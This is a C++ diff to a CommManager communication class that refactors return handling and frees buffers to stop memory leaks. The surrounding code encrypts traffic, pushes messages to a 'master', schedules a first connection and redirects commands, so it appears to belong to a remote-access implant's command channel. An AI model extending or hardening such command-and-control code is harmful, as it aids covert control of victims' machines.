@@ -76,7 +76,9 @@ BOOL CommManager::Send( COMM_NAME commName, ULONG targetIP, const LPBYTE pData, 
 
 	XorFibonacciCrypt(pData, dwSize, (LPVOID)(LPBYTE)buffer, 2, 7);
 
-	return m_commList[commName]->Send(targetIP, (LPBYTE)buffer, dwSize);
+	BOOL ret = m_commList[commName]->Send(targetIP, (LPBYTE)buffer, dwSize);
+
+	return ret;
 }
 
 BOOL CommManager::SendAndRecv( COMM_NAME commName, ULONG targetIP, const LPBYTE pSendData, DWORD dwSendSize, ByteBuffer& recvData )
@@ -90,6 +92,7 @@ BOOL CommManager::SendAndRecv( COMM_NAME commName, ULONG targetIP, const LPBYTE 
 	LPBYTE pRecvData = NULL;
 	DWORD dwRecvSize = 0;
 	BOOL bRet = m_commList[commName]->SendAndRecv(targetIP, (LPBYTE)sendBuffer, dwSendSize, &pRecvData, dwRecvSize);
+
 	if (! bRet) 
 	{
 		errorLog(_T("send and recv[%d] failed"), commName);
@@ -139,13 +142,13 @@ BOOL CommManager::PushMsgToMaster( COMM_NAME commName, const CommData& data, CPS
 	debugLog(_T("put message [%I64u][%I64u]"), data.GetMsgID(), data.GetSerialID());
 		
 	CPGUID serverGuid = {0};
-	if (! m_cp.PutMessage(serverGuid, byteData, byteData.Size(), commName, dwMaxDataSizePerPacket, pCPSerial, data.GetMsgID()))
-	{
-		errorLog(_T("put msg to cp failed"));
-		return FALSE;
-	}
+	
+	BOOL ret = m_cp.PutMessage(serverGuid, byteData, byteData.Size(), commName, dwMaxDataSizePerPacket, pCPSerial, data.GetMsgID());
 
-	return TRUE;
+	if (! ret)
+		errorLog(_T("put msg to cp failed"));
+
+	return ret;
 }
 
 void CommManager::CleanMsgByMSGID(MSGID msgid)
@@ -286,6 +289,8 @@ void CommManager::MessageSenderProc()
 	BOOL bFirstConnect = TRUE;
 	BOOL bWaitUntil = (g_ConfigInfo.nFirstConnectHour >= 0 && g_ConfigInfo.nFirstConnectMinute >= 0);
 
+	ByteBuffer recvByteData;
+
 	while (m_bWorking)
 	{
 		if (! m_bWorking) break;
@@ -326,9 +331,12 @@ void CommManager::MessageSenderProc()
 				
 		//发送并接收
 		/*if (! IsCommAvailable(commName)) continue;*/
-		ByteBuffer recvByteData;
 
-		if (! SendAndRecv(commName, targetIP, toSendByteData, toSendByteData.Size(), recvByteData))
+		BOOL ret = SendAndRecv(commName, targetIP, toSendByteData, toSendByteData.Size(), recvByteData);
+
+		toSendByteData.Free();
+
+		if (! ret)
 		{
 			CmdRedirector &cmd = Manager::GetInstanceRef().m_cmdRedirector;
 
@@ -336,6 +344,9 @@ void CommManager::MessageSenderProc()
 				cmd.Stop();
 
 			errorLog(_T("sendrecv msg [%d] failed"), commName);
+
+			recvByteData.Free();
+
 			continue;
 		}
 		if (!IsConnected())
@@ -345,7 +356,12 @@ void CommManager::MessageSenderProc()
 
 		//将收到的消息传递给CutupProtocol
 		if (recvByteData.Size() == 0) continue;
-		if (! m_cp.AddRecvPacket(recvByteData, recvByteData.Size(), commName))
+
+		ret = m_cp.AddRecvPacket(recvByteData, recvByteData.Size(), commName);
+
+		recvByteData.Free();
+
+		if (! ret )
 		{
 			errorLog(_T("recv invalid cp packet"));
 			continue;
@@ -355,17 +371,25 @@ void CommManager::MessageSenderProc()
 		if (! m_cp.HasReceivedMsg()) continue;
 		CPGUID from;
 		ByteBuffer receivedMessageInByteData;
+
 		if (! m_cp.RecvMsg(receivedMessageInByteData, from)) 
 		{
+			receivedMessageInByteData.Free();
 			errorLog(_T("recv msg from cp failed"));
 			continue;
 		}
 		CommData recvData;
-		if (! recvData.Parse(receivedMessageInByteData, receivedMessageInByteData.Size()))
+
+		ret = recvData.Parse(receivedMessageInByteData, receivedMessageInByteData.Size());
+
+		receivedMessageInByteData.Free();
+
+		if (!ret  )
 		{
 			errorLog(_T("parse received msg failed"));
 			continue;
 		}
+
 		debugLog(_T("recv msg [%I64u][%I64u]"), recvData.GetMsgID(), recvData.GetSerialID());
 
 		MSGID msgid = recvData.GetMsgID();
